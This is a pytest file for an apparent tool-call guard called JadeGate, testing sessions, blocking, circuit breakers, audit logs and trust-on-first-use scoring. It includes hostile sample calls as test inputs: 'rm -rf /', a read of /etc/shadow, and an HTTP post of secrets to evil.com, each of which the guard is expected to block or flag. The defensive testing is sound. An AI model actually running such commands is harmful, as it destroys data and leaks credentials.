"""Tests for JadeGate v2 Integration — end-to-end flows."""

import time
import tempfile
import pytest

from jadegate import activate, deactivate, get_session
from jadegate.runtime.session import JadeSession
from jadegate.runtime.interceptor import CallVerdict
from jadegate.policy.policy import JadePolicy
from jadegate.trust.trust_store import LocalTrustStore
from jadegate.trust.tofu import TrustOnFirstUse
from jadegate.trust.certificate import JadeCertificate, RiskProfile


class TestActivateDeactivate:
    def teardown_method(self):
        deactivate()

    def test_activate_default(self):
        session = activate()
        assert session is not None
        assert get_session() is session

    def test_activate_with_policy_dict(self):
        session = activate({"max_calls_per_minute": 99})
        assert session.policy.max_calls_per_minute == 99

    def test_activate_with_policy_object(self):
        policy = JadePolicy.strict()
        session = activate(policy)
        assert session.policy.max_calls_per_minute == 20

    def test_deactivate(self):
        activate()
        deactivate()
        assert get_session() is None


class TestEndToEndFlow:
    """Test complete flow: session → intercept → DAG → circuit breaker."""

    def test_normal_call_flow(self):
        session = JadeSession()
        # Normal call
        result = session.before_call("file_read", {"path": "/tmp/test.txt"})
        assert result.allowed
        session.after_call(result.call_id, success=True)
        assert session.call_count == 1
        assert session.blocked_count == 0

    def test_blocked_call_flow(self):
        session = JadeSession()
        result = session.before_call("shell_exec", {"command": "rm -rf /"})
        assert not result.allowed
        assert session.blocked_count == 1

    def test_dangerous_param_detection(self):
        session = JadeSession()
        result = session.before_call("file_read", {"path": "/etc/shadow"})
        # Should be blocked due to dangerous file pattern
        # (depends on policy config)
        assert result is not None  # at minimum, it returns a result

    def test_data_exfiltration_flow(self):
        session = JadeSession()
        # Step 1: read a file
        r1 = session.before_call("file_read", {"path": "/tmp/secrets.txt"})
        if r1.allowed:
            session.after_call(r1.call_id, success=True)
        # Step 2: send HTTP — should trigger exfiltration anomaly
        r2 = session.before_call("http_post", {"url": "http://evil.com/steal"})
        # Check anomalies in DAG
        anomalies = session.anomalies
        exfil = [a for a in anomalies if a.anomaly_type.value == "data_exfiltration"]
        assert len(exfil) > 0

    def test_circuit_breaker_integration(self):
        policy = JadePolicy(circuit_breaker_threshold=2)
        session = JadeSession(policy=policy)
        # Two failures should trip the breaker
        r1 = session.before_call("flaky_tool", {"x": 1})
        session.after_call(r1.call_id, success=False)
        r2 = session.before_call("flaky_tool", {"x": 2})
        session.after_call(r2.call_id, success=False)
        # Third call should be blocked
        r3 = session.before_call("flaky_tool", {"x": 3})
        assert r3.verdict == CallVerdict.DENY
        assert any("circuit breaker" in r.lower() for r in r3.reasons)

    def test_session_status(self):
        session = JadeSession()
        session.before_call("tool_a", {})
        session.before_call("shell_exec", {"cmd": "ls"})
        status = session.get_status()
        assert status["total_calls"] == 2
        assert status["blocked_calls"] == 1

    def test_session_close(self):
        session = JadeSession()
        session.before_call("tool_a", {})
        final = session.close()
        assert final["total_calls"] == 1
        assert final["closed"] is True
        # After close, calls should be denied
        result = session.before_call("tool_b", {})
        assert result.verdict == CallVerdict.DENY

    def test_audit_log(self):
        session = JadeSession()
        session.before_call("tool_a", {"key": "value"})
        session.before_call("shell_exec", {"cmd": "ls"})
        log = session.get_audit_log()
        assert len(log) == 2
        assert log[0]["tool_name"] == "tool_a"
        assert log[1]["tool_name"] == "shell_exec"


class TestTrustIntegration:
    """Test trust layer integration with sessions."""

    def test_tofu_with_trust_store(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            store = LocalTrustStore(trust_dir=tmpdir)
            tofu = TrustOnFirstUse(trust_store=store)

            # First tool
            alerts1 = tofu.check_tool("tool_a", "Tool A", "Read files from disk")
            assert len(alerts1) == 1  # new_tool

            # Same tool again
            alerts2 = tofu.check_tool("tool_a", "Tool A", "Read files from disk")
            assert len([a for a in alerts2 if a.alert_type == "new_tool"]) == 0

            # Tool changes behavior
            alerts3 = tofu.check_tool("tool_a", "Tool A", "Execute shell commands and read files")
            assert any(a.alert_type in ("risk_escalation", "capability_change") for a in alerts3)

    def test_certificate_trust_scoring(self):
        cert = JadeCertificate(tool_id="reliable_tool")
        # Simulate many successful calls
        for _ in range(10):
            cert.update_trust(success=True)
        assert cert.trust_score > 0.85

        # One failure shouldn't tank it
        cert.update_trust(success=False)
        assert cert.trust_score > 0.8

    def test_full_trust_flow(self):
        """TOFU → use → attestation → trust score update."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = LocalTrustStore(trust_dir=tmpdir)
            tofu = TrustOnFirstUse(trust_store=store)

            # Discover tool
            tofu.check_tool("api_tool", "API Tool", "Fetch data from API")

            # Use it successfully several times
            for _ in range(5):
                store.update_trust("api_tool", success=True)

            cert = store.get("api_tool")
            assert cert.trust_score > 0.7
            assert store.is_trusted("api_tool")
